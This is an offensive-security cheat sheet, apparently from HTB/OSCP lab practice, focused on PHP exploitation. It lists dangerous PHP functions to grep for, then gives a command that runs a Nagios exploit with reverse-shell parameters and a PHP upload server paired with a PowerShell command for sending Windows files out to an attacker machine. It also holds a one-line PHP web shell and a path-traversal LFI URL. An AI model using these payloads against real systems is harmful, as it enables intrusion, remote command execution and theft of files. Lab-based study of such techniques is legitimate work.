__tags: php web 

### PHP Interesting Function List

```
find . -name "*.php" | xargs grep "<function-name>"

    exec
    shell_exec
    system
    passthru
    pcntl_exec
    popen
    proc_open
    eval
    preg_replace (with /e modifier)
    create_function
    file_get_contents
    file_put_contents
    readfile
    include
    require
    require_once
    include_once

```

--> url decode:

```
php -r 'echo urldecode("srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb\n");'
```

--> Run php script with arguments:

```
php 47299.php --host=192.168.245.136 --ssl=false --user=nagiosadmin --pass=admin --reverseip=192.168.49.245 --reverseport=13000
```


### Upload Server (Windows Exfil)

1. Get Apache running on kali with php support

2. Save to /var/www/

```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

3. Upload!!!

```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
```

```bash
curl -F file=@clip.txt http://127.0.0.1/upload.php
```

### ----- 

### PHP execute system command (Reverse Shell)
```
<?php system($_REQUEST['COMMAND']); ?>
```


### Check for locale file inclusion on a page(windows box):

```
# this can work if you something like "include($_GET["page"]" in your php code since this will call anything that the a user will put in as a "page" variable
# if allow_url_include is set to "0" in php.ini, then RFI is disabled, but LFI is still a thing

http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

### Default locations
```bash

/proc/self/cwd/index.php
/var/www/html/index.php
```